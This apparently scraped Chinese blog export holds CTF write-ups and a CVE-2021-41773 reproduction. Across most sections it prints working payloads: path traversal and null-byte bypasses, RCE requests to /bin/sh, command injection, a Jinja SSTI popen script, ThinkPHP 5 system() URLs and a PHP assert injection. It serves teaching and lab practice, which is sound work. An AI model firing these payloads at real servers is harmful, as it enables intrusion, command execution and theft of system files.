Bypass\n\nhttps://localhost/c$/windows/win.ini\n\n4.过滤绕过\n\n单次替换，如..//\nURL编码\n16位Unicode编码\n超长UTF-8编码\n\n5.加密参数传递的数据\n有的网站程序传递参数后会进行base64加密（当然也会有其他加密），导致我们传递的参数无法解析，所以就无法利用目录遍历，而绕过方式也很简单，就是先对参数进行base64加密后再进行传参。如：\n?page=bTByZS50eHQ=\n6.目录限定绕过\n有些Web应用程序是通过限定目录权限来分离的。可以使用一些特殊的符号~来绕过。比如提交这样的xxx.php?page=~/../boot。就可以直接跳转到硬盘目录下。\n7.绕过文件后缀过滤\n一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。\n比如：../../../../boot.ini%00.jpg，Web应用程序使用的Api会允许字符串中包含空字符，当实际获取文件名时，则由系统的Api会直接截短，而解析为../../../../boot.ini。\n在类Unix的系统中也可以使用Url编码的换行符，例如：../../../etc/passwd%0a.jpg如果文件系统在获取含有换行符的文件名，会截短为文件名。也可以尝试%20，例如: ../../../index.php%20\n8.绕过来路验证\n\nHttp Referer : HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的\n在一些Web应用程序中，会有对提交参数的来路进行判断的方法，而绕过的方法可以尝试通过在网站留言或者交互的地方提交Url再点击或者直接修改Http Referer即可，这主要是原因Http Referer是由客户端浏览器发送的，服务器是无法控制的，而将此变量当作一个值得信任源是错误的。\n\n0x03 防御\n方案一：过滤恶意字符，如..、./、.\\等\n缺点：黑名单过滤不全的话，很容易被绕过。\n方案二：采用白名单方式，只允许读取特定文件，若不是特定文件直接拦截。也可以仅允许纯字母或数字字符等。\n方案三：按照.分割，读文件名参数和文件格式参数，如果文件名参数中有..，则拦截\n0x04 附录：UNC路径\n\n\nUNC（Universal Naming Convention）\n\n\n为了迎合网络化的趋势，windows的地址风格（C:\\ABC\\def\\文件、\\\\计算机名\\dir\\file）向网络地址风格做了一次兼容变换。\n\n\n整体形式如：\nfile://机器的IP地址/目录/文件\n\nfile表示协议类型\n:// 后面是机器的网络地址\n/后面是目录和文件名\n\n\n\n我们访问网上邻居所采用的命令行访问法，实际上应该称作UNC路径访问法。\n\n\n0x05 漏洞实战\nCVE-2021-41773\n漏洞概述\nApache HTTP Server（简称 Apache）是开源的 Web 服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。它快速、可靠并且可通过简单的 API 扩展，将 Perl/Python 等解释器编译到服务器中。\nApache 披露了一个在 Apache HTTP Server 2.4.49 上引入的漏洞，称为 CVE-2021-41773。同时发布了2.4.50更新，修复了这个漏洞。该漏洞允许攻击者绕过路径遍历保护，使用编码并读取网络服务器文件系统上的任意文件。运行此版本 Apache 的 Linux 和 Windows 服务器都受到影响。此漏洞是在 2.4.49 中引入的，该补丁旨在提高 URL 验证的性能。可以通过对“.”进行编码来绕过新的验证方法。如果 Apache 网络服务器配置未设置为“要求全部拒绝”，则漏洞利用相对简单。通过对这些字符进行编码并使用有效负载修改 URL，可以实现经典的路径遍历。\n影响版本\n\n41773——版本等于2.4.49\n42013——版本等于2.4.49/50\n\n在服务器开启cgi或cgid模块的情况下，该漏洞可执行任意命令。\n复现过程\n浏览器访问ip:8080。页面出现it works! 证明开启成功。\n\n开启代理，上神器burpsuite就可以开搞了。\n路径穿越GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\n\n/icons/目录是一个存在且可访问的目录，测试时也可改为其他目录如/cgi-bin/，但在本环境中/cgi-bin/目录访问状态码为403，因此使用了/icons/目录\n\n\nRCEPOST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1echo; ls（要执行的命令）\n\n修复方案\n升级到最新版的Apache HTTP Server 安全版本。\n利用工具\n多翻了一下相关文章，找到了一个漏洞利用工具。\nhttps://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013\n思考\n关于上述/bin/sh如何可以执行命令的思考总结\n首先他说：在服务器开启cgi或cgid模块的情况下，该漏洞可执行任意命令。\n那了解一下CGI程序的含义：GPT回答\nApache 中间件中，CGI 是 Common Gateway Interface（通用网关接口）的缩写。CGI 是一种标准的协议，它定义了 Web 服务器如何与外部程序（通常是脚本或可执行文件）进行通信，从而处理动态内容并将其呈现给客户端的浏览器。当客户端请求一个需要服务器动态生成内容的网页时，Web 服务器会将请求传递给 CGI 程序。这个 CGI 程序可以是任何可执行的脚本（如Perl、Python、Bash脚本等）或编译的可执行文件。CGI 程序会处理请求并生成相应的动态内容，然后将结果返回给服务器，最终由服务器传递给客户端浏览器。Apache 中的 CGI 模块允许服务器与 CGI 程序进行交互。当 Apache 接收到一个包含 CGI 路径的请求时，它会启动相应的 CGI 程序，并将请求的信息传递给它（例如：请求方法、头部、查询参数等）。CGI 程序可以读取这些信息并根据需要生成响应内容。\n也就是说该程序可以执行脚本，并且也支持bash脚本\n查看 apache 关于 cgi 的文档：\nSTDIN and STDOUTOther communication between the server and the client happens over standard input (STDIN) and standard output (STDOUT). In normal everyday context, STDIN means the keyboard, or a file that a program is given to act on, and STDOUT usually means the console or screen.When you POST a web form to a CGI program, the data in that form is bundled up into a special format and gets delivered to your CGI program over STDIN. The program then can process that data as though it was coming in from the keyboard, or from a fileThe &quot;special format&quot; is very simple. A field name and its value are joined together with an equals (=) sign, and pairs of values are joined together with an ampersand (&amp;). Inconvenient characters like spaces, ampersands, and equals signs, are converted into their hex equivalent so that they don&#x27;t gum up the works. The whole data string might look something like:name=Rich%20Bowen&amp;city=Lexington&amp;state=KY&amp;sidekick=Squirrel%20Monkey\n有道翻译：\n标准输入和标准输出服务器和客户机之间的其他通信通过标准输入(STDIN)和标准输出(STDOUT)进行。在正常的日常上下文中，STDIN指的是键盘，或者是程序要执行的文件，而STDOUT通常指的是控制台或屏幕。当您向CGI程序发布web表单时，该表单中的数据被捆绑成一种特殊格式，并通过STDIN传递给您的CGI程序。然后，程序就可以处理这些数据，就好像它是从键盘或文件中输入的一样“特殊格式”非常简单。字段名及其值用等号(=)连接在一起，值对用&amp;号(&amp;)连接在一起。不方便的字符，如空格、&amp;号和等号，被转换成它们的十六进制等号，这样它们就不会把工作搞得一团糟。整个数据字符串可能看起来像这样:name=Rich%20Bowen&amp;city=Lexington&amp;state=KY&amp;sidekick=Squirrel%20Monkey\n也就是说，通过 POST 传入的 参数，会作为 stdin 的内容，交给 所访问的 cgi 程序处理\n如果访问的是 /bin/sh ，那么就能直接 getshell 了\n也就是你post传入的参数内容被当做bash脚本执行了（这里恰好该服务器对url路径启用了CGI脚本，因此可以执行代码）\n","categories":["常见top漏洞"]},{"title":"攻防世界-command_execution","url":"/2023/08/07/command_execution/","content":"题目描述：\n小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。\n题目解题：\n\n进入页面如图所示，题目告诉我们这关没写waf，所以随便输入命令即可进行命令执行\n命令执行漏洞即使用者可以直接在Web应用中执行系统命令，从而获取敏感信息或者拿下shell权限。其造成的原因是Web服务器对用户输入命令安全检测不足（比如没加waf），导致恶意代码被执行。ping用于确定本地主机是否能与另一台主机成功交换(发送与接收)数据包，再根据返回的信息，就可以推断TCP/IP参数是否设置正确，以及运行是否正常、网络是否通畅等\n先用本机127.0.0.1去ping一下看\n\n发现有回显，说明ping成功了。然后我们可以将输入参数截断从而让其运行危险的参数。\n常见管道连接符如下：\n\n\n\n;\nA;B\n先执行A，再执行B\n\n\n\n\n&amp;\nA&amp;B\n简单拼接，A B之间无制约关系\n\n\n|\nA|B\n显示B的执行结果\n\n\n&amp;&amp;\nA&amp;&amp;B\nA执行成功，然后才会执行B\n\n\n||\nA||B\nA执行失败，然后才会执行B\n\n\n\n那我们输入：127.0.0.1|ls看看\n\n成功执行，那么找一下flag，find / name &quot;flag*&quot;\n\n查看flag.txt即可\n\nICMP是Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。\n而ICMP协议主要是靠ping工具来实现的。使用ping了之后会收到来自ip地址（也有可能是通过DNS把url给解析为ip地址）的回复。而ping本地的回环地址（127.0.0.1）的操作是检查本机的网卡，TCP/IP配置是否正确，也是使用ping工具的首要步骤。\n参考文章：\nwp参考\n","categories":["攻防世界"]},{"title":"攻防世界-xff_referer","url":"/2023/08/07/xff_referer/","content":"题目描述：\nX老师告诉小宁其实xff和referer是可以伪造的。\n题目解题：\n\n很明显，我们直接bp修改xff头\n\n如图所示，修改后提示信息如图，那我们修改referer头\n\n成功得到flag\n","categories":["攻防世界"]},{"title":"攻防世界-upload1","url":"/2023/08/07/upload1/","content":"题目描述：\n无\n题目解题：\n\n来到页面，以为这道题很难呢，结果。。。   这与难度也不匹配啊，不说了，开始解题\n首先随便上传一个文件夹试试水\n\n发现我再上传了一个普通的1.txt之后，弹出了一个验证框，那估计就是前端验证了，这里F12禁用js即可，接着抓包修改试试\n\n修改为php后，发现成功上传。。。。。，那我们访问一下\n\n发现成功种马，那直接蚁剑连接\n\n找到flag。。。。。。。\n","categories":["攻防世界"]},{"title":"攻防世界-Web_php_include","url":"/2023/08/14/Web_php_include/","content":"题目描述：\n无\n题目解题：\n根据题目信息，很明显是文件包含，这里附上源码\n &lt;?phpshow_source(__FILE__);echo $_GET[&#x27;hello&#x27;];$page=$_GET[&#x27;page&#x27;];while (strstr($page, &quot;php://&quot;)) &#123;    $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);&#125;include($page);?&gt;\nstrstr-函数解析\n\n这里也就是get传参之后，判断参数中是否有指定字符，有的话将其替换为空\n这里看到echo的地方，以为还要变量覆盖啥的来输出内容，不过似乎行不通，那就用其他伪协议吧\ndata伪协议\n\n\n接着查看源代码即可拿到flag\n这里不在赘述剩余方法，感兴趣可以参考文章自行尝试\n文章参考：\n参考一\n参考二\n","categories":["攻防世界"]},{"title":"攻防世界-ics-05","url":"/2023/08/17/ics-05/","content":"题目描述：\n其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统\n题目解题：\n\n进入页面之后，点来点去也就设备维护中心有东西，其他都是一样的页面\n\n\n查看源代码发现有个get参数，我们传一下看看\n\n这里我是直接想到的文件包含，如上图得到index.php的源码，我们解码看看\n&lt;?php$page = $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt;    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;    &lt;div style=&quot;text-align:center&quot;&gt;        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;else&#123;?&gt;        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;        &lt;div style=&quot;text-align:center&quot;&gt;            &lt;p class=&quot;lead&quot;&gt;                &lt;?php                if (strpos($page, &#x27;input&#x27;) &gt; 0) &#123;                    die();                &#125;                if (strpos($page, &#x27;ta:text&#x27;) &gt; 0) &#123;                    die();                &#125;                if (strpos($page, &#x27;text&#x27;) &gt; 0) &#123;                    die();                &#125;                if ($page === &#x27;index.php&#x27;) &#123;                    die(&#x27;Ok&#x27;);                &#125;                    include($page);                    die();                ?&gt;        &lt;/p&gt;        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;&#125;//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;    $pattern = $_GET[pat];    $replacement = $_GET[rep];    $subject = $_GET[sub];    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;        preg_replace($pattern, $replacement, $subject);    &#125;else&#123;        die();    &#125;&#125;?&gt;\n重要代码如上，先解释一些不常见函数的含义\n\n\npreg_replace  — 执行一个正则表达式的搜索和替换\nmixed preg_replace    ( mixed $pattern   , mixed $replacement   , mixed $subject   [, int $limit = -1   [, int &amp;$count  ]] )\n搜索subject中匹配pattern的部分，   以replacement进行替换。\npreg_replace($pattern, $replacement, $subject)函数将subject中匹配到的replacement用pattern替换，如果启用/e参数的话，就会将replacement当做php代码执行。\n$pattern: 要搜索的模式，可以是字符串或一个字符串数组、正则。\n$replacement: 用于替换的字符串或字符串数组。\n$subject: 要搜索替换的目标字符串或字符串数组。\n\n/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向\n引用替换完之后）。\n提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。\n\n这里也是看了wp发现此处竟然可以命令执行，当时分析了半天不知道从哪入手。。。。\n说明我们要给http的头部添加X-forwarded-For=127.0.0.1，即可利用上述的函数，bp修改也可以，这里我用hackbar修改\n\n成功执行第一步\n\n根据该函数的特性我们构造如下paylaod：\n?pat=/abc/e&amp;rep=&lt;?php system(&#x27;ls&#x27;);?&gt;&amp;sub=abc//此处pat中的abc前有斜杠的原因是，符合正则表达式的开头，以匹配sub中的abc\n\n查看可以文件s3chachaDir\n\n这里估计flag还是文件夹，那么再次ls看看\n\n如此，cat一下即可，F12看到flag\n\n参考文章：\nwp参考一\nwp参考二\n伪协议参考\n","categories":["攻防世界"]},{"title":"攻防世界-Web_php_unserialize","url":"/2023/08/08/Web_php_unserialize/","content":"题目描述：\n无\n题目解题：\n &lt;?php class Demo &#123;     private $file = &#x27;index.php&#x27;;    public function __construct($file) &#123;         $this-&gt;file = $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file != &#x27;index.php&#x27;) &#123;             //the secret is in the fl4g.php            $this-&gt;file = &#x27;index.php&#x27;;         &#125;     &#125; &#125;if (isset($_GET[&#x27;var&#x27;])) &#123;     $var = base64_decode($_GET[&#x27;var&#x27;]);     if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123;         die(&#x27;stop hacking!&#x27;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;\n很尴尬，这题已经做过了，感兴趣可以翻翻我以前的文章，这里就直接上pop了，也很简单\n&lt;?php   class Demo &#123;      private $file = &#x27;index.php&#x27;;     public function __construct($file) &#123;          $this-&gt;file = $file;      &#125;     function __destruct() &#123;          echo @highlight_file($this-&gt;file, true);      &#125;     function __wakeup() &#123;          if ($this-&gt;file != &#x27;index.php&#x27;) &#123;              //the secret is in the fl4g.php             $this-&gt;file = &#x27;index.php&#x27;;          &#125;      &#125;  &#125;$a= new Demo(&#x27;fl4g.php&#x27;);$poc=serialize($a);   $poc=str_replace(&#x27;O:4&#x27;, &#x27;O:+4&#x27;,$poc);  $poc=str_replace(&#x27;:1:&#x27;, &#x27;:2:&#x27;,$poc);   echo $poc;$poc = (base64_encode($poc));  echo $poc;?&gt;\n输出如下：\nO:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==\n\n拿到flag\n","categories":["攻防世界"]},{"title":"攻防世界-Web_python_template_injection","url":"/2023/08/08/Web_python_template_injection/","content":"题目描述：\n无\n题目解题：\n\n看到该页面，毫无疑问就是python的ssti注入了，那我们抓包看一下\n在这里看到页面也没有注入的地方，就想着现在url后面直接加上模板看看\n\n如上图，成功证明存在ssti漏洞\n那我们先取object这个类，随后在列举出其所有子类（这里我是先看了看第400个以后的元素）\n\n\n这里又找到一个popen命令函数，那我们在定位一下，这里采用如下payload\n&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;\n直接上脚本找\nimport requestsheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;&#125;for i in range(500):    url = &quot;http://61.147.171.105:62011/=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#x27;popen&#x27; in res.text:        print(i)\n找到237，定位一下看看\n\n成功定位，那直接传参数ls，payload如下\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[237](&quot;ls&quot;,shell=True,stdout=-1).communicate()&#125;&#125;\n详细使用方法可以参考Python手册，这里communicate函数作用是将命令执行后的内容输出出来\n\n找到flag，cat读一下看看\n&#123;&#123;().__class__.__bases__[0].__subclasses__()[237](&quot;cat fl4g&quot;,shell=True,stdout=-1).communicate()&#125;&#125;\n\n成功\n","categories":["攻防世界"]},{"title":"攻防世界-lottery","url":"/2023/08/17/lottery/","content":"题目描述：\n无\n题目解题：\n\n进入页面，发现是一个买东西的网站，点击play之后让我们注册账号，这里随便一个即可，注册完以后浏览一下\n\n发现在该页面下，只有攒够钱才能买flag，不出意外就是逻辑漏洞了，结合题目给的附件，也就是源代码，我们先在购买页面随便购买，看看网站流量的动向\n\n那么我们查看一下api.php\n\n在这里发现，他将我们输入的数字与产生的随机数进行比较，比较相同数字的个数，进行对应钱数的增加，这里值得注意的是，这里用的是弱比较，并且没有对我们输入的东西进行过滤\n这里注意一个PHP特性：布尔值true和任意字符串都弱相等，除了0和false，因为0也认为是bool false，true是不等于false的，例如\nvar_dump(true==&quot;hyuf&quot;)                   //truevar_dump(True == 0);\t                 //bool(false)var_dump(True == &#x27;False&#x27;);\t             //bool(true)var_dump(True == 2);\t                 //bool(true)\n由此，我们完全可以令输入的内容为一个包含7个true元素的数组，这样我们账户的余额一定是增加的，我们直接抓包修改\n\n\n\n拿到flag\n文章参考：\nwp参考\n","categories":["攻防世界"]},{"title":"攻防世界-php_rce","url":"/2023/08/14/php_rce/","content":"题目描述：\n无\n题目信息：\n这里也是第一正式做有关框架的漏洞，那就顺手学习一波\n0x01 ThinkPHP 5漏洞简介\nThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。该更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。\n看得出来程序没经过控制器进行过滤，所以可以用/来控制程序。\n搞不懂这个漏洞是怎么搞出来的，借用一下大神的答案。\n?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令 (如 dir whoami)\nThinkPHP框架的主要特点包括：\nMVC架构：采用经典的MVC（Model-View-Controller）架构，将应用程序的业务逻辑、数据模型和用户界面分离，使得应用程序更易于维护和扩展。\nORM支持：提供了强大的ORM（Object-Relational Mapping）支持，可以将数据库表映射为对象，使得开发人员可以更方便地操作数据库。\n缓存支持：提供了多种缓存支持，包括文件缓存、Memcached缓存、Redis缓存等，可以提高应用程序的性能和响应速度。\n安全性：提供了多种安全机制，包括输入验证、输出过滤、SQL注入防护、XSS防护等，可以保障应用程序的安全性。\n扩展性：提供了丰富的扩展机制，包括插件机制、行为机制、模板引擎扩展等，可以方便地扩展和定制应用程序。\n\n0x02 PHP REC\nPHP RCE 指的是通过远程代码执行漏洞（Remote Code Execution）来攻击 PHP 程序的一种方式。简单来说，由于PHP应用程序没有正确处理外部输入数据（如用户提交的表单、请求参数等），攻击者通过某些手段向 PHP 应用程序中注入恶意代码，然后通过这些恶意代码实现对受攻击服务器的控制。\n下面简单介绍一种常见的远程 RCE 漏洞利用方式，即利用 PHP 中的 eval 函数实现 RCE 的方式。在该示例中，攻击者可以通过 HTTP 请求向目标服务器传递 PHP 代码，并执行该代码：\n// 服务端代码\n$user_input = $_GET['user_input']; // 没有对输入进行过滤\neval('$result = ' . $user_input . ';'); // 远程代码执行\n\n// 攻击者构造恶意代码\nhttp://example.com/index.php?user_input=system('ls%20-la');\n//远程执行 &quot;ls -la&quot; 命令。\n\n由于服务器代码没有对 user_input 的内容进行过滤和验证，攻击者可以通过 user_input 参数发送任意 PHP 代码，并将其作为一个字符串传递给 eval 函数进行执行，成功实现ls -la命令。\n在 Unix/Linux 系统中，ls -la 命令可以列出当前目录下的所有文件和子目录，并显示它们的详细信息，包括权限、创建时间、大小等等。\n0x03 ThinkPHP V5漏洞Payload\n3.1 thinkphp 5.0.22\n1、http://192.168.1.1/thinkphp/public/?s=.|think\\config/get&amp;name=database.username2、http://192.168.1.1/thinkphp/public/?s=.|think\\config/get&amp;name=database.password3、http://url/to/thinkphp_5.0.22/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id4、http://url/to/thinkphp_5.0.22/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\n3.2 thinkphp 5\n1、http://127.0.0.1/tp5/public/?s=index/\\think\\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1\n3.3 thinkphp 5.0.21\n1、http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id2、http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1\n3.4 thinkphp 5.1.\n1、http://url/to/thinkphp5.1.29/?s=index/\\think\\Request/input&amp;filter=phpinfo&amp;data=12、http://url/to/thinkphp5.1.29/?s=index/\\think\\Request/input&amp;filter=system&amp;data=cmd3、http://url/to/thinkphp5.1.29/?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E4、http://url/to/thinkphp5.1.29/?s=index/\\think\\view\\driver\\Php/display&amp;content=%3C?php%20phpinfo();?%3E5、http://url/to/thinkphp5.1.29/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=16、http://url/to/thinkphp5.1.29/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd7、http://url/to/thinkphp5.1.29/?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=18、http://url/to/thinkphp5.1.29/?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd\n3.5 thinkphp5.0.20\n1、http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id\n题目解题：\n在这里呢，不先啰嗦漏洞的复现，复现就放在漏洞库吧，有时间先搞这个，我们回归题目\n方法一：手工\n使用thinkphp 5.1.payload，测试一手框架版本\nURL + /?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls\n回显如下：\n真实原理目前没了解，不过能看出来，这里的poc思路是调用一个方法，传入call_user_func_array函数，接着传入system，则会成功执行system(‘ls’)；命令\n\n发现报错，显示版本为5.0.20，那我们对应使用poc即可\n?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id\n\n成功执行，更换命令\n?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls\n\n在查看一下根目录\n?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /\n\n?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag\n\n拿到flag\n方法二：工具检测\n对于thinkphp框架Github上有一个专用的漏洞验证工具：https://github.com/zangcc/Aazhen-v3.1\n下载项目中的jar包之后，在Aazhen_RexHa文件根目录下运行命令打开该工具\njava -javaagent:rexha.jar -jar rexha.jar\n打开工具后将靶场地址粘进去，全扫一遍后发现有两个漏洞，一个是远程代码执行，还有一个数据库信息泄露\n\n远程代码任意执行一般能拿到不少东西，先使用这个，此工具已经给一个可用的url案例，我们只需要更改就可以了\nhttp://61.147.171.105:49836/index.php?s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=system&amp;vars%5B1%5D%5B%5D=id //这个url已经过urlencode，为了方便理解，下面一行使用urldecode结果展示http://61.147.171.105:49836/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id \n参数解析这个URL参数是对目标web服务器进行的远程代码执行    ThinkPHP的请求处理器（think）    应用程序控制器（app）    函数调用器（invokefunction）    通过invokefunction指定了要调用的函数名为&quot;calluserfuncarray&quot;。该函数的作用是调用一个用户自定义的函数，并将一个数组作为参数传递给该函数。    在这个URL请求中，该函数的第一个参数是&quot;system&quot;，表示要执行的系统命令，    第二个参数是一个数组，其中包含要传递给该命令的参数。在这个例子中，该数组只包含一个参数&quot;id&quot;下面我们把的第二个数组元素内容作为要执行的命令修改以下就ok了\n这里参考方法一即可，不在赘述\n参考文章：\n方法一参考\n方法二参考\n","categories":["攻防世界"]},{"title":"攻防世界-mfw","url":"/2023/08/17/mfw/","content":"题目描述：\n无\n题目解题：\n\n进入页面，一个个都点了点，没啥用的，查看url发现有个page参数，想着或许是文件包含，试了试没啥成果，于是想到扫网站，然后用dirsearch扫了一下，发现有git泄露，于是在后面添加/.git/访问看看\n\n发现的确是git泄露，这时下载了这些文件发现都是乱码，不知道咋处理了，看了wp发现要利用工具来还原代码\nGithack：工具下载(linux): git clone https://github.com/lijIEjIE/GitHack.git\n命令：python GitHack.py http://61.147.171.105:63789/.git\n\n成功下载，查看index.php，找到重要代码\n&lt;?phpif (isset($_GET[&#x27;page&#x27;])) &#123;\t$page = $_GET[&#x27;page&#x27;];&#125; else &#123;\t$page = &quot;home&quot;;&#125;$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &#x27;..&#x27; is dangerous!assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);?&gt;\nstrpos()函数查找&quot;..&quot;在$file中第一次出现的位置。如果没有找到则返回falsefile_exists()函数检查$file是否存在assert()函数会将括号中的字符当成代码来执行，并返回true或false\n因此这里就是利用assert执行代码，那么就要想办法插入命令函数，因此构造如下payload\n这里我们也知道flag在./templates/flag.php目录处\n?page=&#x27;) or system(&#x27;cat templates/flag.php&#x27;);//\n被传入之后变成：\n$file=&quot;templates/&#x27;) or system(&#x27;cat ./templates/flag.php&#x27;);//.php&quot;\nstrpos()返回false，再利用or让其执行system函数，再用&quot; // &quot;将后面的语句注释掉\nassert(&quot;strpos(&#x27;template/&#x27;) or system(&#x27;cat ./template/flag.php&#x27;);//.php, &#x27;..&#x27;) === false&quot;)\n下划线内容被注释掉了，所以真正执行了以下语句\nstrpos(&#x27;template/&#x27;) or system(&#x27;cat ./template/flag.php&#x27;);\n\n拿到flag\n参考文章：\nwp参考\n","categories":["攻防世界"]},{"title":"攻防世界-simple_js","url":"/2023/08/17/simple_js/","content":"题目描述：\n小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )\n题目解题：\n\n一个密码框，随便输入一个试试\n\n说是假密码。。。，那看一下源代码\nfunction dechiffre(pass_enc)&#123;    var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;    var tab  = pass_enc.split(&#x27;,&#x27;);    var tab2 = pass.split(&#x27;,&#x27;);var i,j,k,l=0,m,n,o,p = &quot;&quot;;i = 0;j = tab.length;    k = j + (l) + (n=0);    n = tab2.length;    for(i = (o=0); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i]));                                          if(i == 5)break;&#125;    for(i = (o=0); i &lt; (k = j = n); i++ )&#123;        o = tab[i-l];        if(i &gt; 5 &amp;&amp; i &lt; k-1)            p += String.fromCharCode((o = tab2[i]));    &#125;    p += String.fromCharCode(tab2[17]);    pass = p;return pass;    &#125;    String[&quot;fromCharCode&quot;](dechiffre(&quot;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30&quot;));    h = window.prompt(&#x27;Enter password&#x27;);    alert( dechiffre(h) );\n一个很纯粹的js代码，那肯定就要审计了，这里也是对我来说有点难，第一次遇到，那么就GPT和wp共同参考一下\n一.代码定义了一个dechiffre函数，因为还没有调用，就先不理他了。先将十六进制转换成字符串，使用网址：https://www.bejson.com/convert/ox2str/  或者直接将十六进制参数放入python的print()中。即s=&quot;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30&quot;print (s)转换结果:55,56,54,79,115,69,114,116,107,49,50 二.执行了String[&quot;fromCharCode&quot;](dechiffre(&quot;55,56,54,79,115,69,114,116,107,49,50&quot;)); 2.1 